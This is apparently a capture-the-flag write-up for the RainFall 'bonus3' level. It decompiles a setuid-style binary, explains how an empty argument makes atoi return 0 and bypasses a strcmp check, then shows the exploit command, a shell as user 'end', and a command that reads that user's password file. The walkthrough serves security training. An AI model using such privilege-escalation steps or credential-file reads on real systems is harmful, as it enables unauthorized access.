## Phase 1: Reconnaissance

We find the final binary, `bonus3`, in the home directory

The program requires exactly one argument:

```console
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ echo $?
255

bonus3@RainFall:~$ ./bonus3 test
bonus3@RainFall:~$ echo $?
0
```

---

## Phase 2: Static Analysis

Using Ghidra, we recover the following logic:

```c
int main(int argc, char **argv)
{
    char buffer[132];
    FILE *password_file;

    password_file = fopen("/home/user/end/.pass", "r");
    memset(buffer, 0, sizeof(buffer));

    if (password_file == NULL || argc != 2)
        return -1;

    fread(buffer, 1, 66, password_file);
    buffer[65] = '\0';
    buffer[atoi(argv[1])] = '\0';
    fread(buffer + 66, 1, 65, password_file);
    fclose(password_file);

    if (strcmp(buffer, argv[1]) == 0)
        execl("/bin/sh", "sh", NULL);
    else
        puts(buffer + 66);
}
```

The first `fread()` places up to 66 bytes from the `end` password file at `buffer[0]`. The program forces `buffer[65]` to null, writes another null byte at an index derived from our argument, and then attempts a second read into `buffer + 66`

The index from `atoi(argv[1])` is not bounds-checked, so it could also produce an out-of-bounds write. We do not need that more dangerous path: index 0 is enough to turn the first string into an empty string

If the strings match, it starts a shell with `end` privileges

---

## Phase 3: Bypassing the Comparison

We pass an empty string as the single argument. It still satisfies `argc == 2`, because the empty string is a real argument containing only its terminating null byte:

```text
argv[1] = ""
atoi("") = 0
```

The program therefore executes:

```c
buffer[0] = '\0';
```

Now both values passed to `strcmp()` begin with a null byte:

```text
buffer  = ""
argv[1] = ""
```

`strcmp()` stops at the first null byte and returns 0, so the program enters the success branch. No stack corruption or injected code is required; this level is a logic flaw caused by converting unchecked text to an array index before authentication

---

## Phase 4: Exploitation

We run the binary with one empty argument:

```console
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
```

The comparison succeeds and `execl()` opens the final shell

---

## Phase 5: Retrieving the Final Password

We read the password for the `end` user:

```console
cat /home/user/end/.pass
```

This reveals the final flag and completes the project
